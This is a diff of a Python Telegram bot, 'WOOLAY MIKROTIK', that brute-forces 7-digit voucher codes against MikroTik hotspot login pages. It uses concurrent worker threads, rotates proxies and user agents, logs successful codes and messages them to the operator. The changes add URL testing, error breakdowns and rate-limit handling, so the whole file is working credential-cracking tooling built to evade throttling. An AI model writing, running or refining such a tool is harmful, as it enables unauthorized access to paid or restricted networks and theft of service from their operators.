@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""WOOLAY MIKROTIK - Simple Working Version"""
+"""WOOLAY MIKROTIK - Error Fix + Diagnostics"""
 
 import os
 import sys
@@ -9,6 +9,7 @@ import time
 import random
 import threading
 import datetime
+import socket
 import concurrent.futures
 from typing import Optional, Set, List, Dict
 
@@ -30,10 +31,8 @@ from threading import Thread
 # ═══════════════════════════════════════════════════════════════
 
 _flask = Flask(__name__)
-
 @_flask.route("/")
-def _home():
-    return "WOOLAY alive", 200
+def _home(): return "WOOLAY alive", 200
 
 def _flask_run():
     _flask.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
@@ -53,7 +52,7 @@ HIT_FILE   = "hits.txt"
 PROXY_FILE = "proxies.txt"
 STATE_FILE = "state.json"
 
-NUM_WORKERS    = 100
+NUM_WORKERS    = 50
 CODE_LENGTH    = 7
 CODE_TOTAL     = 10 ** CODE_LENGTH
 REQ_TIMEOUT    = 15
@@ -73,6 +72,46 @@ USER_AGENTS = [
 # ═══════════════════════════════════════════════════════════════
 
 scanners: Dict[int, dict] = {}
+
+# ═══════════════════════════════════════════════════════════════
+#  URL TEST
+# ═══════════════════════════════════════════════════════════════
+
+def test_url(url: str) -> str:
+    """Test if URL works. Returns result string."""
+    # DNS check
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(url)
+        hostname = parsed.hostname
+        if hostname:
+            ip = socket.gethostbyname(hostname)
+            if ip.startswith(("192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.3")):
+                return f"❌ Local IP: {ip}\nRailway ကနေ မရောက်နိုင်ဘူး"
+    except Exception as e:
+        return f"⚠️ DNS Error: {e}"
+
+    # Connection check
+    try:
+        r = requests.post(
+            url,
+            data={"dst": "http://connectivitycheck.gstatic.com/generate_204", "popup": "true", "username": "0000000", "password": ""},
+            timeout=REQ_TIMEOUT,
+            verify=False,
+            allow_redirects=True,
+        )
+        if "invalid username or password" in r.text.lower():
+            return f"✅ URL အလုပ်လုပ်သည်!\nStatus: {r.status_code}\nBad code ကို မှန်ကန်စွာ ပြန်ပေးသည်"
+        elif "already authorizing" in r.text.lower():
+            return f"✅ URL အလုပ်လုပ်သည်!\nStatus: {r.status_code}\nRate limit ဖြစ်နေသည်"
+        else:
+            return f"⚠️ Status: {r.status_code}\nBody: {r.text[:200]}"
+    except requests.exceptions.ConnectionError as e:
+        return f"❌ ConnectionError\nServer က ဝင်ခွင့်မပြုဘူး\n{e}"
+    except requests.exceptions.Timeout:
+        return f"❌ Timeout ({REQ_TIMEOUT}s)\nServer က မြန်မြန် မပြန်ပေးဘူး"
+    except Exception as e:
+        return f"❌ Error: {type(e).__name__}\n{e}"
 
 # ═══════════════════════════════════════════════════════════════
 #  PROXY
@@ -151,8 +190,8 @@ def save_state(uid: int, data: dict):
 #  CHECKER
 # ═══════════════════════════════════════════════════════════════
 
-def check_one_code(code: str, login_url: str, proxy: Optional[str] = None) -> str:
-    """Check one code. Returns: 'hit' | 'bad' | 'limit' | 'net'"""
+def check_one_code(code: str, login_url: str, proxy: Optional[str] = None) -> tuple:
+    """Check one code. Returns: (result, error_detail)"""
 
     dst = f"http://192.168.{random.randint(0,255)}.{random.randint(1,254)}/"
     ua = random.choice(USER_AGENTS)
@@ -190,38 +229,36 @@ def check_one_code(code: str, login_url: str, proxy: Optional[str] = None) -> st
 
         # HIT
         if "you are logged in" in body:
-            return "hit"
+            return "hit", ""
 
         if ("invalid username or password" not in body
             and "already authorizing" not in body
             and "error" not in body
             and len(r.text) > 100):
-            return "hit"
+            return "hit", ""
 
         # BAD
         if "invalid username or password" in body:
-            return "bad"
+            return "bad", ""
 
         # LIMIT
         if any(w in body for w in ["already authorizing", "retry later", "request limited", "too many"]):
-            return "limit"
+            return "limit", ""
 
-        return "bad"
+        return "bad", ""
 
     except requests.exceptions.Timeout:
-        return "net"
+        return "net", "Timeout"
     except requests.exceptions.ConnectionError:
-        return "net"
-    except Exception:
-        return "net"
+        return "net", "ConnErr"
+    except Exception as e:
+        return "net", type(e).__name__
 
 # ═══════════════════════════════════════════════════════════════
 #  SCANNER
 # ═══════════════════════════════════════════════════════════════
 
 def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, bot):
-    """Run scanner in background thread"""
-
     state = scanners.get(uid)
     if state is None:
         return
@@ -234,9 +271,12 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
     hits = 0
     limits = 0
     net_err = 0
+    bad_count = 0
     last_hit = None
     current_code = None
     hit_list = []
+    last_error = ""
+    error_types = {}  # Count error types
 
     start_time = time.time()
 
@@ -253,8 +293,16 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
         speed = int(tried_n / elapsed * 60)
         px_txt = f"🕷️ {len(proxies)}" if proxies else "⚡ DIRECT"
 
+        # Error breakdown
+        err_parts = []
+        if net_err > 0:
+            err_parts.append(f"Net:{net_err}")
+        if limits > 0:
+            err_parts.append(f"Lim:{limits}")
+        err_str = " | ".join(err_parts) if err_parts else "0"
+
         hit_lines = ""
-        for h in hit_list[-10:]:
+        for h in hit_list[-5:]:
             hit_lines += f"\n  ▸ <code>{h}</code>"
         if not hit_list:
             hit_lines = "\n  💀 None yet"
@@ -265,17 +313,18 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
             "╚═════════════════════════╝\n\n"
             "🔍 <b>SEARCHING...</b>\n\n"
             "📊 <b>STATS</b>\n"
-            f"├ 👁️ Tested  <code>{tried_n:,}</code>\n"
+            f"├ ✅ Bad     <code>{bad_count:,}</code>\n"
             f"├ 🩸 Hits    <code>{hits}</code>\n"
-            f"├ ⚠️ Limits  <code>{limits}</code>\n"
-            f"└ ❌ Errors  <code>{net_err}</code>\n\n"
+            f"├ ⚠️ Errors  <code>{err_str}</code>\n"
+            f"├ 👁️ Total   <code>{tried_n:,}</code>\n\n"
             "⚡ <b>SPEED</b>\n"
             f"├ 🚀 <code>{speed:,} c/m</code>\n"
             f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
             f"└ 🕷️ <code>{px_txt}</code>\n\n"
             "🎯 <b>NOW</b>\n"
             f"├ 🔮 <code>{current_code or '—'}</code>\n"
-            f"├ 🗡️ <code>{last_hit or '—'}</code>\n\n"
+            f"├ 🗡️ <code>{last_hit or '—'}</code>\n"
+            f"└ 📜 <code>{last_error or 'OK'}</code>\n\n"
             f"🎁 <b>HITS • {len(hit_list)}</b>"
             f"{hit_lines}\n\n"
             f"╭─ ⚡ WOOLAY ─╮"
@@ -293,7 +342,7 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
         except Exception:
             pass
 
-    last_dash = time.time()
+    last_dash = 0
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
         futures = {}
@@ -301,7 +350,8 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
         while not state["stop_flag"].is_set():
 
             # Submit new codes
-            while len(futures) < NUM_WORKERS * 2:
+            submit_count = 0
+            while len(futures) < NUM_WORKERS and submit_count < NUM_WORKERS:
                 if mode == "num7":
                     if counter >= CODE_TOTAL:
                         break
@@ -317,26 +367,24 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
                 proxy = get_proxy()
                 future = executor.submit(check_one_code, code, login_url, proxy)
                 futures[future] = code
+                submit_count += 1
 
             if not futures:
                 break
 
-            # Collect results
-            done_futures = []
-            for fut in list(futures.keys()):
-                if fut.done():
-                    done_futures.append(fut)
+            # Collect done results
+            done, not_done = concurrent.futures.wait(
+                futures.keys(), timeout=1.0,
+                return_when=concurrent.futures.FIRST_COMPLETED,
+            )
 
-            if not done_futures:
-                time.sleep(0.01)
-                continue
-
-            for fut in done_futures:
+            for fut in done:
                 code = futures.pop(fut)
                 try:
-                    result = fut.result()
-                except Exception:
+                    result, err_detail = fut.result()
+                except Exception as e:
                     result = "net"
+                    err_detail = type(e).__name__
 
                 tried_n += 1
                 current_code = code
@@ -345,64 +393,90 @@ def run_scanner_thread(uid: int, login_url: str, mode: str, start_counter: int, 
                     hits += 1
                     hit_list.append(code)
                     last_hit = code
-                    # Save hit
+                    last_error = f"🔥 HIT: {code}"
                     try:
                         with open(HIT_FILE, "a") as f:
                             f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {code}\n")
                     except Exception:
                         pass
-                    # Notify
                     try:
-                        bot.send_message(
-                            uid,
-                            f"🎉 <b>HIT!</b>\n🔑 <code>{code}</code>",
-                            parse_mode=ParseMode.HTML,
-                        )
+                        bot.send_message(uid, f"🎉 <b>HIT!</b>\n🔑 <code>{code}</code>", parse_mode=ParseMode.HTML)
                     except Exception:
                         pass
 
+                elif result == "bad":
+                    bad_count += 1
+                    last_error = "✅ OK"
+
                 elif result == "limit":
                     limits += 1
+                    last_error = "⚠️ LIMIT"
 
                 elif result == "net":
                     net_err += 1
+                    last_error = f"❌ {err_detail}"
+                    # Track error types
+                    error_types[err_detail] = error_types.get(err_detail, 0) + 1
 
-            # Dashboard update every 3 seconds
+            # Dashboard every 3 sec
             now = time.time()
             if now - last_dash >= 3:
                 send_dashboard()
                 last_dash = now
 
-            # Save state every 20 seconds
-            if now - start_time > 0 and int(now) % 20 == 0:
-                save_state(uid, {
-                    "url": login_url, "mode": mode,
-                    "counter": counter, "tried_n": tried_n,
-                    "hits": hits, "limits": limits, "net": net_err,
-                    "last_hit": last_hit,
-                    "hit_list": hit_list[-100:],
-                })
+            # If too many net errors, slow down
+            if net_err > 10 and tried_n > 0:
+                ratio = net_err / tried_n
+                if ratio > 0.8:
+                    # 80% errors - slow down
+                    time.sleep(2)
+                    if net_err > 100 and hits == 0:
+                        # Too many errors, probably URL doesn't work
+                        try:
+                            bot.send_message(
+                                uid,
+                                "❌ <b>Too many connection errors!</b>\n\n"
+                                f"Tested: {tried_n}\n"
+                                f"Net Errors: {net_err}\n"
+                                f"Hits: {hits}\n\n"
+                                "🔍 URL ကို စစ်ဆေးပါ:\n"
+                                "1. Server က cloud IP ခွင့်ပြုလား?\n"
+                                "2. Proxy ထည့်လား?\n"
+                                "3. URL မှန်လား?",
+                                parse_mode=ParseMode.HTML,
+                            )
+                        except Exception:
+                            pass
+                        state["stop_flag"].set()
+                        break
 
     # Final dashboard
     elapsed = max(time.time() - start_time, 1)
     speed = int(tried_n / elapsed * 60)
-    px_txt = f"🕷️ {len(proxies)}" if proxies else "⚡ DIRECT"
 
     hit_lines = ""
     for h in hit_list[-20:]:
         hit_lines += f"\n  ▸ <code>{h}</code>"
 
+    err_info = ""
+    if error_types:
+        err_info = "\n".join([f"  {k}: {v}" for k, v in error_types.items()])
+
     txt = (
         "╔═════════════════════════╗\n"
-        "║   💀 <b>SCAN STOPPED</b> 💀   ║\n"
+        "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
         "╚═════════════════════════╝\n\n"
         "📊 <b>FINAL</b>\n"
         f"├ 👁️ Tested  <code>{tried_n:,}</code>\n"
+        f"├ ✅ Bad     <code>{bad_count:,}</code>\n"
         f"├ 🩸 Hits    <code>{hits}</code>\n"
         f"├ ⚠️ Limits  <code>{limits}</code>\n"
-        f"├ ❌ Errors  <code>{net_err}</code>\n"
-        f"├ 🚀 Speed   <code>{speed:,} c/m</code>\n"
-        f"└ 🕷️ <code>{px_txt}</code>\n\n"
+        f"├ ❌ NetErr  <code>{net_err}</code>\n"
+        f"└ 🚀 Speed   <code>{speed:,} c/m</code>\n\n"
+    )
+    if err_info:
+        txt += "❌ <b>Errors:</b>\n" + err_info + "\n\n"
+    txt += (
         f"🎁 <b>HITS • {len(hit_list)}</b>"
         f"{hit_lines}\n\n"
         "💾 <i>/start to resume</i>\n\n"
@@ -439,8 +513,8 @@ def main_kb():
          InlineKeyboardButton("📜 MODES", callback_data="btn_mode")],
         [InlineKeyboardButton("⚡ START", callback_data="btn_start"),
          InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")],
-        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy"),
-         InlineKeyboardButton("👁️ STATUS", callback_data="btn_status")],
+        [InlineKeyboardButton("🧪 TEST URL", callback_data="btn_test"),
+         InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_proxy")],
         [InlineKeyboardButton("⚡ WOOLAY ⚡", url=OWNER_LINK)],
     ])
 
@@ -485,7 +559,8 @@ async def cmd_start(update, context):
            f"{px}\n"
            f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
            f"{ul}\n{rv}\n"
-           "💡 <i>/stop to stop</i>")
+           "💡 <i>/stop to stop</i>\n"
+           "🧪 <i>TEST URL နှိပ်ပီး စစ်ဆေးပါ</i>")
 
     await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
 
@@ -510,14 +585,37 @@ async def on_btn(update, context):
         context.user_data["login_url"] = ""
 
     if d == "btn_back":
-        await cmd_start(q, context)
-        return
+        url = context.user_data["login_url"]
+        mode = context.user_data["mode"]
+        proxies = load_proxies()
+        px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
+        ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"
+        txt = (f"╔═════════════════════════╗\n"
+               "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
+               "╚═════════════════════════╝\n\n"
+               f"📜 Mode: <code>{mode}</code>\n"
+               f"{px}\n"
+               f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
+               f"{ul}\n\n"
+               "💡 <i>/stop to stop</i>")
+        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
 
-    if d == "btn_url":
+    elif d == "btn_url":
         context.user_data["wait_url"] = True
         cur = context.user_data.get("login_url", "Not set")
         await q.edit_message_text(
             f"🔮 <b>Send Login URL</b>\n\nCurrent: <code>{cur}</code>\n\nNew URL:",
+            parse_mode=ParseMode.HTML, reply_markup=back_kb())
+
+    elif d == "btn_test":
+        url = context.user_data.get("login_url", "")
+        if not url:
+            await q.answer("❌ Set URL first!", show_alert=True)
+            return
+        await q.edit_message_text("🧪 <b>Testing URL...</b>", parse_mode=ParseMode.HTML)
+        result = test_url(url)
+        await q.edit_message_text(
+            f"🧪 <b>URL Test Result</b>\n\n<code>{url}</code>\n\n{result}",
             parse_mode=ParseMode.HTML, reply_markup=back_kb())
 
     elif d == "btn_mode":
@@ -525,7 +623,20 @@ async def on_btn(update, context):
 
     elif d.startswith("m_"):
         context.user_data["mode"] = d[2:]
-        await cmd_start(q, context)
+        url = context.user_data["login_url"]
+        mode = context.user_data["mode"]
+        proxies = load_proxies()
+        px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
+        ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"
+        txt = (f"╔═════════════════════════╗\n"
+               "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
+               "╚═════════════════════════╝\n\n"
+               f"📜 Mode: <code>{mode}</code>\n"
+               f"{px}\n"
+               f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
+               f"{ul}\n\n"
+               "💡 <i>/stop to stop</i>")
+        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
 
     elif d == "btn_start":
         if scanners.get(uid, {}).get("running"):
@@ -534,6 +645,12 @@ async def on_btn(update, context):
         url = context.user_data.get("login_url", "")
         if not url:
             await q.answer("❌ Set URL first!", show_alert=True)
+            return
+
+        # Test URL first
+        result = test_url(url)
+        if "❌" in result:
+            await q.answer("❌ URL မအလုပ်လုပ်ဘူး! TEST URL နှိပ်ပါ", show_alert=True)
             return
 
         mode = context.user_data.get("mode", "num7")
@@ -549,11 +666,7 @@ async def on_btn(update, context):
             "dash_id": msg.message_id,
         }
 
-        t = Thread(
-            target=run_scanner_thread,
-            args=(uid, url, mode, counter, context.bot),
-            daemon=True,
-        )
+        t = Thread(target=run_scanner_thread, args=(uid, url, mode, counter, context.bot), daemon=True)
         t.start()
 
     elif d == "stop_scan":
@@ -563,12 +676,6 @@ async def on_btn(update, context):
             await q.answer("🛑 Stopping!")
         else:
             await q.answer("Not running", show_alert=True)
-
-    elif d == "btn_status":
-        proxies = load_proxies()
-        await q.edit_message_text(
-            f"🕷️ <b>Proxy</b>\n\nActive: <code>{len(proxies)}</code>",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
 
     elif d == "btn_proxy":
         context.user_data["wait_px"] = True
@@ -583,15 +690,17 @@ async def on_msg(update, context):
     if context.user_data.get("wait_url"):
         context.user_data["wait_url"] = False
         context.user_data["login_url"] = txt.strip()
-        await update.message.reply_text("✅ <b>URL Saved!</b>", parse_mode=ParseMode.HTML)
-        await cmd_start(update, context)
+        await update.message.reply_text("✅ <b>URL Saved!</b>\n\n🧪 TEST URL နှိပ်ပီး စစ်ဆေးပါ", parse_mode=ParseMode.HTML)
+        # Auto test
+        result = test_url(txt.strip())
+        await update.message.reply_text(f"🧪 <b>Test:</b>\n\n{result}", parse_mode=ParseMode.HTML)
 
     elif context.user_data.get("wait_px"):
         context.user_data["wait_px"] = False
         a, b = add_proxies(txt.strip().splitlines())
         total = len(load_proxies())
         await update.message.reply_text(
-            f"🕷️ Added: <code>{a}</code> | Invalid: <code>{b}</code> | Total: <code>{total}</code>",
+            f"🕷️ Added: <code>{a}</code> | Bad: <code>{b}</code> | Total: <code>{total}</code>",
             parse_mode=ParseMode.HTML)
 
 # ═══════════════════════════════════════════════════════════════
@@ -600,7 +709,6 @@ async def on_msg(update, context):
 
 def main():
     keep_alive()
-
     print("=" * 50)
     print("  WOOLAY MIKROTIK - Starting...")
     print("=" * 50)
@@ -610,7 +718,6 @@ def main():
     app.add_handler(CommandHandler("stop", cmd_stop))
     app.add_handler(CallbackQueryHandler(on_btn))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))
-
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
